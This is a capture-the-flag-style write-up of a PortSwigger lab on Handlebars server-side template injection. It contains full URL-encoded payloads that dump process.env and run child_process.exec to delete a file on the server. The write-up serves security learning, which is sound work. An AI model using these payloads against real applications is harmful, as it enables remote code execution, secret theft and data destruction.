# [Server-side template injection] Lab: Server-side template injection in an unknown language with a documented exploit (1)

---

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled.png)

the query string in the URL is being reflected in the 

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled%201.png)

Let fuzz the query string: 

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled%202.png)

the result 

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled%203.png)

so from this error we can see that the template engine is handle bars

lets look for any exploits for handlebars: 

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled%204.png)

trying POC: 

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled%205.png)

was able to get this : 

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled%206.png)

closing the existing tag with }}

now in error I seen something mentioning the context lets look more into that : 

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled%207.png)

result: 

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled%208.png)

using this resource: 

https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled%209.png)

the reason for this payload compared to other ones was that they were to long and the server would give 500. 

but that payload above worked after I URL encoded it:

 

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled%2010.png)

URL: [https://0ac300eb04d3bc6a8195c02800800023.web-security-academy.net/?message=](https://0ac300eb04d3bc6a8195c02800800023.web-security-academy.net/?message=){[https://0ac300eb04d3bc6a8195c02800800023.web-security-academy.net/?message={{%23with "s" as |string|}}
  {{%23with "e"}}
    {{%23with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{%23with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return JSON.stringify(process.env)%3B"}}
        {{this.pop}}
        {{%23each conslist}}
          {{%23with (string.sub.apply 0 codelist)}}
            {{this}}
          {{%2Fwith}}
        {{%2Feach}}
      {{%2Fwith}}
    {{%2Fwith}}
  {{%2Fwith}}
{{%2Fwith}}](https://0ac300eb04d3bc6a8195c02800800023.web-security-academy.net/?message=%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%72%6f%63%65%73%73%2e%65%6e%76%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d)

now that I was able to expose the environment variables I can try exploit them: 

- `"NODE_PATH": "/opt/node-v19.8.1-linux-x64/lib/node_modules/"`
- `"PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"`
- `"LOGNAME": "carlos"`
- `"USER": "carlos"`
- `"HOME": "/home/carlos"`
- `"SHELL": "/bin/bash"`
- `"TERM": "unknown"`
- `"SUDO_COMMAND": "/opt/node-v19.8.1-linux-x64/lib/node_modules/../../bin/node -e var handlebars = require('handlebars')\nvar source = require('fs').readFileSync(process.stdin.fd, 'utf-8')\nvar template = handlebars.compile(source)\nvar data = {}\nconsole.log(template(data))"`
- `"SUDO_USER": "academy"`
- `"SUDO_UID": "10000"`
- `"SUDO_GID": "10000"`

now that we can also see how the payload works that it is running javascript we can add our own command in :

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled%2011.png)

URL: [https://0ac300eb04d3bc6a8195c02800800023.web-security-academy.net/?message=wrtz{{%23with "s" as |string|}}
    {{%23with "e"}}
        {{%23with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{%23with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm %2Fhome%2Fcarlos%2Fmorale.txt')%3B"}}
                {{this.pop}}
                {{%23each conslist}}
                    {{%23with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{%2Fwith}}
                {{%2Feach}}
            {{%2Fwith}}
        {{%2Fwith}}
    {{%2Fwith}}
{{%2Fwith}}](https://0ac300eb04d3bc6a8195c02800800023.web-security-academy.net/?message=%77%72%74%7a%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d)

![Untitled](%5BServer-side%20template%20injection%5D%20Lab%20Server-side%20t%20922e6f4640ba4d52b836a5de74a105bb/Untitled%2012.png)